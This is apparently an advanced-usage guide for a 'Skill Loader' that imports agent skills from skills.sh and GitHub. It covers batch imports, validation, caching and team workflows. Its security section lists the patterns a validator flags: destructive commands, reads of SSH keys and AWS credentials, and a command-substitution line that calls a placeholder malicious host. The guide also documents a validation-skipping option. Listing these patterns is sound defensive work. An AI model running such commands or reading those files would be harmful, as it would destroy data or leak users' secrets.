---
inclusion: manual
---

# Skill Loader Advanced Usage

Advanced patterns and techniques for power users.

## Advanced Workflows

### Batch Importing Skills

Import multiple related skills for a complete workflow:

```
# Web development stack
Import react-component-builder as a power
Import react-hooks-helper as a power
Import css-helper as a steering file
Import api-tester as a power

# Data processing stack
Import pdf-extractor as a power
Import csv-parser as a power
Import json-validator as a power
Import data-transformer as a steering file
```

**Tip**: Import core skills as powers, reference materials as steering files.

### Conditional Validation

Skip validation for trusted sources (use with caution):

```
Import custom-skill with skipValidation: true
```

**When to use**:
- Skills from your own repositories
- Skills you've manually reviewed
- Internal company skills

**Never use for**:
- Unknown sources
- Public repositories you haven't reviewed
- Skills with security warnings

### Custom Skill Repositories

While the Skill Loader focuses on skills.sh, you can fetch from any GitHub repository:

```
Fetch owner/repo-name/path/to/skill
```

**Example**:
```
Fetch mycompany/internal-skills/skills/custom-tool
```

**Requirements**:
- Must be a public GitHub repository
- Must follow Agent Skills format
- Must have valid YAML frontmatter

### Skill Inspection Workflow

Thoroughly inspect a skill before importing:

```
# 1. Search for the skill
Search for authentication skills

# 2. Fetch the content
Fetch oauth-handler

# 3. Validate security
Validate the oauth-handler skill

# 4. Check the source
Show me the GitHub repository for oauth-handler

# 5. Review install count
How many installs does oauth-handler have?

# 6. Import if satisfied
Import oauth-handler as a power
```

### Format Conversion

Convert between steering files and powers:

```
# Import as steering file first (to try it out)
Import pdf-extractor as a steering file

# Use it for a while...

# Convert to power (for permanent use)
Import pdf-extractor as a power

# Remove the steering file if you don't need it
Remove .kiro/steering/pdf-extractor.md
```

## Advanced Security

### Understanding Security Patterns

The security validator looks for these patterns:

**Dangerous Commands**:
```bash
rm -rf /path          # Recursive delete
sudo command          # Privilege escalation
eval "code"           # Code execution
kill -9 pid           # Force kill
```

**Suspicious File Operations**:
```bash
/etc/passwd           # System files
~/.ssh/id_rsa         # SSH keys
~/.aws/credentials    # AWS credentials
C:\Windows\System32   # Windows system
```

**Code Injection**:
```bash
$(curl malicious.com) # Command substitution
${variable}           # Variable expansion
`command`             # Backtick execution
```

### Custom Security Review

For skills with warnings, review specific sections:

```
# Fetch the skill
Fetch custom-skill

# Ask for specific analysis
Show me all commands in this skill
Show me all file operations in this skill
Show me all network requests in this skill
```

### Whitelisting Patterns

If you frequently use skills with specific patterns, document your review:

```markdown
# Reviewed Skills

## custom-config-tool
- **Warning**: Accesses ~/.config/
- **Review Date**: 2024-01-15
- **Reviewed By**: Your Name
- **Decision**: Safe - only reads config, doesn't modify
- **Approved**: Yes
```

## Performance Optimization

### Caching Strategy

The MCP server caches the skills.sh directory for 1 hour. To maximize performance:

1. **Batch your searches**: Do multiple searches in one session
2. **Use specific queries**: Narrow searches are faster
3. **Limit results**: Use smaller limits for faster responses

### Reducing Network Requests

Minimize GitHub API calls:

```
# Instead of fetching multiple times
Fetch skill-1
Fetch skill-2
Fetch skill-3

# Fetch once and save
Fetch skill-1 and save to file
# Review the file
# Import when ready
```

### Offline Preparation

Prepare for offline work:

```
# Before going offline, import all needed skills
Import skill-1 as a power
Import skill-2 as a power
Import skill-3 as a steering file

# Skills are now available offline
```

## Automation and Scripting

### Skill Collections

Create collections of related skills:

```markdown
# Web Development Skills

## Frontend
- react-component-builder
- css-helper
- html-validator

## Backend
- api-tester
- database-query-builder
- auth-helper

## DevOps
- docker-composer
- ci-cd-helper
- deployment-guide
```

### Import Scripts

Document your import workflow:

```markdown
# Project Setup Script

1. Import core skills:
   - Import api-tester as a power
   - Import database-query-builder as a power

2. Import project-specific skills:
   - Import react-component-builder as a power
   - Import css-helper as a steering file

3. Verify imports:
   - List my powers
   - List my steering files
```

### Skill Management

Track your imported skills:

```markdown
# Imported Skills Inventory

## Powers (Permanent)
- api-tester (v1.2.3) - Imported 2024-01-15
- database-query-builder (v2.0.1) - Imported 2024-01-15
- react-component-builder (v1.5.0) - Imported 2024-01-16

## Steering Files (Temporary)
- css-helper - Imported 2024-01-16 (for current project)
- deployment-guide - Imported 2024-01-17 (reference)

## To Review
- oauth-handler - Needs security review
- custom-api-tool - Needs testing
```

## Integration Patterns

### Project-Specific Skills

Use steering files for project-specific context:

```
# In project root
.kiro/
  steering/
    project-conventions.md
    api-documentation.md
    testing-guide.md
```

### Team Workflows

Share skill collections with your team:

```markdown
# Team Skills

## Required for All Projects
- code-reviewer
- test-generator
- api-tester

## Frontend Team
- react-component-builder
- css-helper
- accessibility-checker

## Backend Team
- database-query-builder
- api-documentation-generator
- auth-helper
```

### CI/CD Integration

Document skills used in CI/CD:

```yaml
# .github/workflows/skills.yml
name: Import Skills
on: [push]
jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - name: Import test skills
        run: |
          # Import skills needed for testing
          kiro import test-generator as a power
          kiro import code-reviewer as a power
```

## Troubleshooting Advanced Issues

### Rate Limiting

If you hit GitHub rate limits:

```
# Check rate limit status
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/rate_limit

# Wait for reset or authenticate
# Authenticated requests have higher limits (5000/hour vs 60/hour)
```

### Cache Issues

If cached data is stale:

```
# Wait for cache to expire (1 hour)
# Or restart Kiro to clear cache
# Or manually clear cache (if supported)
```

### Custom Repository Issues

If fetching from custom repositories fails:

```
# Verify repository is public
curl https://raw.githubusercontent.com/owner/repo/main/skill.md

# Check file path
# Ensure skill follows Agent Skills format
# Verify YAML frontmatter is valid
```

## Best Practices

### Security
1. Always validate skills from unknown sources
2. Review security warnings carefully
3. Prefer skills from official repositories
4. Check install counts as trust indicator
5. Document your security reviews

### Organization
1. Use powers for frequently used skills
2. Use steering files for temporary context
3. Keep an inventory of imported skills
4. Remove unused skills regularly
5. Document why you imported each skill

### Performance
1. Batch operations when possible
2. Use caching effectively
3. Limit result sizes
4. Prepare for offline work
5. Monitor network usage

### Maintenance
1. Review imported skills periodically
2. Update skills when needed (re-import)
3. Remove obsolete skills
4. Document skill versions
5. Track skill dependencies

## Advanced Examples

### Example: Building a Complete Workflow

```
# 1. Search for related skills
Search for API development skills

# 2. Review top results
Fetch api-tester
Fetch api-documentation-generator
Fetch auth-helper

# 3. Validate each
Validate api-tester
Validate api-documentation-generator
Validate auth-helper

# 4. Import as appropriate
Import api-tester as a power
Import api-documentation-generator as a power
Import auth-helper as a steering file

# 5. Verify
List my powers
List my steering files

# 6. Document
Create a file documenting the workflow
```

### Example: Security-First Import

```
# 1. Fetch skill
Fetch unknown-skill

# 2. Manual review
Show me all commands in this skill
Show me all file operations
Show me all network requests

# 3. Validate
Validate unknown-skill

# 4. Check source
What repository is this skill from?
How many installs does it have?

# 5. Decision
If safe: Import unknown-skill as a power
If unsafe: Do not import

# 6. Document
Record the security review in your notes
```

### Example: Team Onboarding

```
# New team member setup script

# 1. Core skills (everyone needs these)
Import code-reviewer as a power
Import test-generator as a power
Import git-helper as a power

# 2. Role-specific skills
If frontend:
  Import react-component-builder as a power
  Import css-helper as a power

If backend:
  Import api-tester as a power
  Import database-query-builder as a power

# 3. Project-specific skills
Import project-conventions as a steering file
Import api-documentation as a steering file

# 4. Verify setup
List all imported skills
```

## Resources

- **Full Documentation**: See POWER.md
- **Security Guide**: See Security section in POWER.md
- **Troubleshooting**: See Troubleshooting section in POWER.md
- **Agent Skills Standard**: [agentskills.io](https://agentskills.io)
- **MCP Protocol**: [spec.modelcontextprotocol.io](https://spec.modelcontextprotocol.io)

## Summary

You now know:
- ✓ Advanced import workflows
- ✓ Security best practices
- ✓ Performance optimization
- ✓ Automation patterns
- ✓ Team integration strategies

Keep exploring and building great workflows! 🚀

